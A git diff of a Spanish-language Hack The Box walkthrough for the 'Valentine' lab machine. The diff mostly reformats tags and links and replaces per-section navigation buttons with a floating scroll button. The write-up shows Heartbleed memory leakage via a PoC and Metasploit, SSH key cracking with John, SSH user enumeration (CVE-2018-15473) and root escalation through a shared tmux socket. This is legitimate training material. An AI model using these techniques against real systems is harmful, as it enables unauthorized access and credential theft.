@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Valentine - Hack The Box
-excerpt: "Esta fue una máquina relativamente sencilla, investigaremos el puerto HTTP que con la ayuda de nmap y haciendo Fuzzing, encontramos una subpágina que nos dara información valiosa como una llave privada en base hexadecimal. La desciframos pero estara encriptada por lo que no nos servira hasta más adelante. Con la ayuda de nmap encontramos un Exploit llamado Heartbleed con el cual capturaremos data que nos ayudara a descifrar al fin la llave privada y nos dara una contraseña para el SSH, usando el Exploit CVE-2018-15473 pondremos nombres randoms y encontraremos un usuario con el cual entramos. Para escalar privilegios, usamos la herramienta Tmux, que encontramos en el historial de Bash y que nos metera a una nueva terminal como Root."
+excerpt: "Esta fue una máquina relativamente sencilla, investigaremos el puerto HTTP que con la ayuda de nmap y haciendo Fuzzing, encontramos una página que nos dara información valiosa como una llave privada en base hexadecimal. La desciframos, pero estara encriptada por lo que no nos servira hasta más adelante. Con la ayuda de nmap encontramos un Exploit llamado Heartbleed con el cual capturaremos data que nos ayudara a descifrar al fin la llave privada y nos dara una contraseña para el SSH, usando el Exploit CVE-2018-15473 pondremos nombres randoms y encontraremos un usuario con el cual entramos. Para escalar privilegios, usamos la herramienta Tmux, que encontramos en el historial de Bash y que nos metera a una nueva terminal como Root (CVE-2011-1496)."
 date: 2023-04-21
 classes: wide
 header:
@@ -15,20 +15,21 @@ tags:
   - Linux
   - Fuzzing
   - Information Leakage
-  - Desencryptation
-  - Heartbleed Exploitation
+  - Cracking SSH Key
+  - SSL Heartbleed Exploitation
   - SSH User Enumeration
-  - CVE-2018-15473
-  - Tmux 1.6
-  - CVE-2011-1496
+  - CVE-2018-15473 (SSH User Enumeration)
+  - Tmux
+  - Privesc - CVE-2011-1496
   - OSCP Style
   - Metasploit Framework
 ---
 ![](/assets/images/htb-writeup-valentine/valentine_logo.png)
 
-Esta fue una máquina relativamente sencilla, investigaremos el puerto **HTTP** que con la ayuda de **nmap** y haciendo **Fuzzing**, encontramos una subpágina que nos dara información valiosa como una llave privada en base hexadecimal. La desciframos, pero estará encriptada, por lo que no nos servirá hasta más adelante. Con la ayuda de **nmap**, encontramos un Exploit llamado **Heartbleed**, con el cual capturaremos data que nos ayudara a descifrar al fin la llave privada y nos dará una contraseña para el **SSH**, usando el Exploit **CVE-2018-15473** pondremos nombres relacionados a la máquina y encontraremos un usuario con el cual entramos. Para escalar privilegios, usamos la herramienta **Tmux**, que encontramos en el historial de **Bash** y que nos meterá a una nueva terminal como Root.
+Esta fue una máquina relativamente sencilla, investigaremos el puerto **HTTP** que con la ayuda de **nmap** y haciendo **Fuzzing**, encontramos una página que nos dara información valiosa como una llave privada en base hexadecimal. La desciframos, pero estará encriptada por lo que no nos servirá hasta más adelante. Con la ayuda de **nmap** encontramos un Exploit llamado **Heartbleed**, con el cual capturaremos data que nos ayudara a descifrar al fin la llave privada y nos dará una contraseña para el **SSH**, usando el Exploit **CVE-2018-15473** pondremos nombres relacionados a la máquina y encontraremos un usuario con el cual entramos. Para escalar privilegios, usamos la herramienta **Tmux**, que encontramos en el historial de **Bash** y que nos meterá a una nueva terminal como **Root** (CVE-2011-1496).
 
 Herramientas utilizadas:
+* *ping*
 * *nmap*
 * *wappalizer*
 * *whatweb*
@@ -44,7 +45,8 @@ Herramientas utilizadas:
 * *johntheripper*
 * *git*
 * *grep*
-* *msfconsole*
+* *metasploit framework(msfconsole)*
+* *Módulo: auxiliary/scanner/ssl/openssl_heartbleed*
 * *searchsploit*
 * *ssh*
 * *id*
@@ -90,10 +92,7 @@ Herramientas utilizadas:
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
 </div>
 <br>
 
@@ -199,10 +198,7 @@ Me da mucha curiosidad ese puerto 443, pero primero vamos a investigar la págin
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
 </div>
 <br>
 
@@ -226,7 +222,7 @@ http://10.10.10.79 [200 OK] Apache[2.2.22], Country[RESERVED][ZZ], HTTPServer[Ub
 ```
 Nada que nos sea útil.
 
-Te diría que buscaramos en el código fuente, pero no encontraras nada aparte de la imagen, tanto en el puerto 80/HTTP como en el puerto 443/HTTPS, mejor apliquemos **Fuzzing** de una vez.
+Te diría que buscaramos en el código fuente, pero no encontraras nada aparte de la imagen, tanto en el **puerto 80/HTTP** como en el **puerto 443/HTTPS**, mejor apliquemos **Fuzzing** de una vez.
 
 <h2 id="Fuzz">Fuzzing</h2>
 
@@ -244,22 +240,9 @@ Total requests: 220560
 ID           Response   Lines    Word       Chars       Payload                                                              
 =====================================================================
 
-000000001:   200        1 L      2 W        38 Ch       "# directory-list-2.3-medium.txt"                                    
-000000003:   200        1 L      2 W        38 Ch       "# Copyright 2007 James Fisher"                                      
 000000035:   403        10 L     30 W       287 Ch      "cgi-bin"                                                            
-000000007:   200        1 L      2 W        38 Ch       "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"    
 000000015:   200        1 L      2 W        38 Ch       "index"                                                              
 000000014:   200        1 L      2 W        38 Ch       "http://10.10.10.79//"                                               
-000000013:   200        1 L      2 W        38 Ch       "#"                                                                  
-000000012:   200        1 L      2 W        38 Ch       "# on atleast 2 different hosts"                                     
-000000011:   200        1 L      2 W        38 Ch       "# Priority ordered case sensative list, where entries were found"   
-000000009:   200        1 L      2 W        38 Ch       "# Suite 300, San Francisco, California, 94105, USA."                
-000000002:   200        1 L      2 W        38 Ch       "#"                                                                  
-000000008:   200        1 L      2 W        38 Ch       "# or send a letter to Creative Commons, 171 Second Street,"         
-000000006:   200        1 L      2 W        38 Ch       "# Attribution-Share Alike 3.0 License. To view a copy of this"      
-000000005:   200        1 L      2 W        38 Ch       "# This work is licensed under the Creative Commons"                 
-000000010:   200        1 L      2 W        38 Ch       "#"                                                                  
-000000004:   200        1 L      2 W        38 Ch       "#"                                                                  
 000000834:   200        15 L     66 W       1097 Ch     "dev"                                                                
 000000083:   403        10 L     30 W       285 Ch      "icons"                                                              
 000000222:   403        10 L     30 W       283 Ch      "doc"                                                                
@@ -421,10 +404,10 @@ p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
 ¡Listo! Pero nos menciona que está encriptada, vamos a tratar de desencriptarla. 
 
 El siguiente blog, explica como hacerlo:
-* https://sniferl4bs.com/2020/07/password-cracking-101-john-the-ripper-password-cracking-ssh-keys/
+* <a href="https://sniferl4bs.com/2020/07/password-cracking-101-john-the-ripper-password-cracking-ssh-keys/" target="_blank">Password Cracking 101: John The Ripper Password Cracking SSH Keys</a>
 
 Pero, necesitamos la herramienta **ssh2john**, que la puedes encontrar aquí:
-* https://raw.githubusercontent.com/truongkma/ctf-tools/master/John/run/sshng2john.py
+* <a href="https://raw.githubusercontent.com/truongkma/ctf-tools/master/John/run/sshng2john.py" target="_blank">Repositorio de truongkma: ssh2john.py</a>
 
 Vamos a copiar ese script con el comando **wget**:
 ```bash
@@ -558,10 +541,7 @@ Entonces vamos a buscar un Exploit.
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
 </div>
 <br>
 
@@ -569,7 +549,7 @@ Entonces vamos a buscar un Exploit.
 <h2 id="Exploit">Buscando el Exploit Heartbleed</h2>
 
 Mira encontré este:
-* https://github.com/mpgn/heartbleed-PoC
+* <a href="https://github.com/mpgn/heartbleed-PoC" target="_blank">Repositorio de mpgn: Heartbleed PoC</a>
 
 Por lo que entiendo, el Exploit tratara de extraer información almacenada en la memoria del servidor de la máquina y lo guardara en un archivo llamado **out.txt**. 
 
@@ -606,7 +586,7 @@ heartbleed-exploit.py  out.txt  README.md  utils
 ```
 
 **OJO:** utilice el comando **grep** para eliminar parte del output que se repitió mucho, aquí tienes una página que muestra lo útil del comando **grep**:
-* https://geekland.eu/uso-del-comando-grep-en-linux-y-unix-con-ejemplos/
+* <a href="https://geekland.eu/uso-del-comando-grep-en-linux-y-unix-con-ejemplos/" target="_blank">Uso del comando grep en Linux y UNIX con ejemplos</a>
 
 Ahora sí, veamos el contenido:
 ```bash
@@ -666,7 +646,7 @@ cat out.txt | grep -v '00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00'
   1f60: 71 D4 00 00 00 00 00 00 00 00 00 00 00 00 00 00  q...............
 ```
 
-Veo dos cosillas que nos pueden servir, una es esta que es una variable con data en base64:
+Veo dos cosillas que nos pueden servir, una es esta que es una variable con data en **base64**:
 ```bash
 0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc
   0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld
@@ -739,7 +719,7 @@ msf6 auxiliary(scanner/ssl/openssl_heartbleed) > exploit
 [*] 10.10.10.79:443       -             Length: 82
 ...
 ```
-La respuesta es mucho más larga, pero podemos ver la data en base64 que ya habiamos obtenido antes.
+La respuesta es mucho más larga, pero podemos ver la data en **base64** que ya habiamos obtenido antes.
 
 <h2 id="Base64">Descifrando Data en Base64 y Hash</h2>
 
@@ -755,7 +735,7 @@ Y ahora, usemos el comando **base64** para ver si puede descifrar que es esta da
 cat text| base64 -d
 heartbleedbelievethehype
 ```
-Mmmmmm, a mi parecer, esto es una contraseña. ¿Será que es la contraseña para desencriptar la llave privada?, o ¿es la contraseña de un usuario?
+Mmmmmm a mi parecer esto es una contraseña. ¿Será que es la contraseña para desencriptar la llave privada?, o ¿es la contraseña de un usuario?
 
 Como no tenemos un usuario todavia, vamos a probar si es la contraseña para la llave privada.
 ```bash
@@ -777,12 +757,12 @@ Vamos a hacer lo que hicimos en la **máquina Nibbles**, a probar con todo.
 <h2 id="Usuario">Buscando un Usuario Valido para Servicio SSH</h2>
 
 Lo que vamos a probar como usuarios, serán los siguientes:
-* valentine
-* heart
-* bleed
-* heartbleed
-* believe
-* hype
+* *valentine*
+* *heart*
+* *bleed*
+* *heartbleed*
+* *believe*
+* *hype*
 
 Para probarlos, vamos a usar un Exploit que ya utilizamos una vez en la **máquina Blocky**, busquémoslo con **Searchsploit**:
 ```bash
@@ -834,7 +814,7 @@ python2 SSH_Exploit.py 10.10.10.79 hype 2>/dev/null
 **IMPORTANTE**
 
 No podía entrar al servicio **SSH** porque al parecer, necesitas hacer un archivo con unas líneas de código para que el **SSH** acepte llaves tipo **rsa**, aquí lo explican mejor que yo:
-* https://stackoverflow.com/questions/73795935/sign-and-send-pubkey-no-mutual-signature-supported
+* <a href="https://stackoverflow.com/questions/73795935/sign-and-send-pubkey-no-mutual-signature-supported" target="_blank">Sign_and_send_pubkey: no mutual signature supported</a>
 
 Entonces crea el archivo **config** y añade las 2 líneas de código que mencionan:
 ```bash
@@ -873,10 +853,7 @@ Listo, tenemos la flag del usuario. Busquemos como escalar privilegios.
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Post" style="text-align:center;">Post Explotación</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Post" style="text-align:center;">Post Explotación</h1>
 </div>
 <br>
 
@@ -968,19 +945,20 @@ Me recuerda a la herramienta **Terminator** que divide las terminales, supongo q
 Ahora, busquemos si se pueden escalar privilegios. 
 
 Encontré dos cosas:
-* Un Exploit que sirve para las versiones 1.3 y 1.4, veamos que versión de **tmux** usa esta máquina:
+* Un Exploit que sirve para las **versiones 1.3 y 1.4**, veamos que versión de **tmux** usa esta máquina:
 ```bash
 hype@Valentine:~$ tmux -V
 tmux 1.6
 ```
 Mmmmm quizá no sirva.
 
-* Este blog: https://int0x33.medium.com/day-69-hijacking-tmux-sessions-2-priv-esc-f05893c4ded0
+* Este blog: <a href="https://int0x33.medium.com/day-69-hijacking-tmux-sessions-2-priv-esc-f05893c4ded0" target="_blank">Day 69: Hijacking Tmux Sessions 2 Priv. Esc.</a>
 
 El blog explica como escalar privilegios usando un comando de **tmux**, que es el mismo que aparece en el historial. 
 
 Vamos a usarlo:
 ```bash
+hype@Valentine:~$ tmux -S /.devs/dev_sess
 root@Valentine:/home/hype# whoami
 root
 root@Valentine:/home/hype# cd /root
@@ -988,17 +966,15 @@ root@Valentine:~# ls
 curl.sh  root.txt
 root@Valentine:~# cat root.txt
 ```
-Wow, nos metió como a otra consola y somos Root. Bueno, ahí está la flag y con esto terminamos la máquina.
+Wow, nos metió como a otra consola y somos **Root**. Bueno, ahí está la flag y con esto terminamos la máquina.
 
 
 <br>
 <br>
 <div style="position: relative;">
- <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h2 id="Links" style="text-align:center;">Links de Investigación</h2>
 </div>
+
 
 * https://www.enmimaquinafunciona.com/pregunta/182823/sed-para-eliminar-los-espacios-en-blanco
 * https://sniferl4bs.com/2020/07/password-cracking-101-john-the-ripper-password-cracking-ssh-keys/
@@ -1012,3 +988,48 @@ Wow, nos metió como a otra consola y somos Root. Bueno, ahí está la flag y co
 
 <br>
 # FIN
+
+<footer id="myFooter">
+    <!-- Footer para eliminar el botón -->
+</footer>
+
+<style>
+        #backToIndex {
+                display: none;
+                position: fixed;
+                left: 87%;
+                top: 90%;
+                z-index: 2000;
+                background-color: #81fbf9;
+                border-radius: 10px;
+                border: none;
+                padding: 4px 6px;
+                cursor: pointer;
+        }
+</style>
+
+<a id="backToIndex" href="#Indice">
+        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
+</a>
+
+<script>
+    window.onscroll = function() { showButton() };
+
+    function showButton() {
+        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
+        const indicePosition = document.getElementById("Indice").offsetTop;
+        const footerPosition = document.getElementById("myFooter").offsetTop;
+        const windowHeight = window.innerHeight;
+
+        const button = document.getElementById("backToIndex");
+
+        // Mostrar el botón si el usuario ha bajado al índice
+        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
+            button.style.display = "block";
+            button.style.position = "fixed";
+            button.style.top = "90%";
+        } else {
+            button.style.display = "none";
+        }
+    }
+</script>
